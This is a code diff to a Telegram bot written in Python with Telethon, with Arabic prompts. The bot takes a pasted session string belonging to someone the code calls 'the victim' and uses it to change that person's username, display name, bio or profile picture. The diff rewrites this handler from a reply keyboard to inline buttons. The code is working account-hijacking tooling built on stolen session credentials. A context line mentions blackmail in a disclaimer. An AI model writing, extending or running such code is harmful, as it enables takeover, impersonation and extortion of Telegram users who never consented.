@@ -826,42 +826,54 @@ async def users(event):
         
         await event.respond(" غير مبري الذمه اذا استخدمت الامر للابتزاز اللهم اني بلغت فاشهد", buttons=keyboard)
 
-from telethon.tl.types import ReplyKeyboardMarkup, KeyboardButton
-
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Z")))
 async def users(event):
     async with bot.conversation(event.chat_id) as x:
-        options_keyboard = ReplyKeyboardMarkup(
-            [
-                [KeyboardButton("Username")],
-                [KeyboardButton("Name")],
-                [KeyboardButton("Bio")],
-                [KeyboardButton("Picture")]
-            ],
-            resize_keyboard=True
-        )
-        await x.send_message("ماذا تريد أن تغير؟", buttons=options_keyboard)
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
-        
-        if strses.text == "Username":
-            await x.send_message("اكتب الاسم المستخدم الجديد")
-            new_value = await x.get_response()
-            await change_username(strses.text, new_value.text)
-        elif strses.text == "Name":
-            await x.send_message("اكتب الاسم الجديد")
-            new_value = await x.get_response()
-            await change_name(strses.text, new_value.text)
-        elif strses.text == "Bio":
-            await x.send_message("اكتب النبذة الشخصية الجديدة")
-            new_value = await x.get_response()
-            await change_bio(strses.text, new_value.text)
-        elif strses.text == "Picture":
-            await x.send_message("أرسل الصورة الجديدة")
-            new_pic = await x.get_response()
-            await change_pic(strses.text, new_pic.media.photo)
-        await event.reply("تم تغيير الحساب بنجاح", buttons=keyboard)
+        await x.send_message("ماذا تريد ان تغير؟", buttons=[
+            Button.inline("Username", b"username"),
+            Button.inline("Name", b"name"),
+            Button.inline("Bio", b"bio"),
+            Button.inline("Picture", b"picture")
+        ])
+        choice = await x.wait()
+        if choice.data == b"username":
+            await x.send_message("ارسل كود التيرمكس الان")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                await x.send_message("اعطني اليوزر الجديد")
+                new_username = await x.get_response()
+                await change_username(strses.text, new_username.text)
+            else:
+                await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+        elif choice.data == b"name":
+            await x.send_message("ارسل كود التيرمكس الان")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                await x.send_message("اعطني الاسم الجديد")
+                new_name = await x.get_response()
+                await change_name(strses.text, new_name.text)
+            else:
+                await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+        elif choice.data == b"bio":
+            await x.send_message("ارسل كود التيرمكس الان")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                await x.send_message("اعطني البايو الجديد")
+                new_bio = await x.get_response()
+                await change_bio(strses.text, new_bio.text)
+            else:
+                await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+        elif choice.data == b"picture":
+            await x.send_message("ارسل كود التيرمكس الان")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                await x.send_message("اعطني الصورة الجديدة")
+                new_pic = await x.get_response()
+                await change_pic(strses.text, new_pic.media.photo)
+            else:
+                await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+        await event.reply("تم تنفيذ طلبك بنجاح", buttons=keyboard)
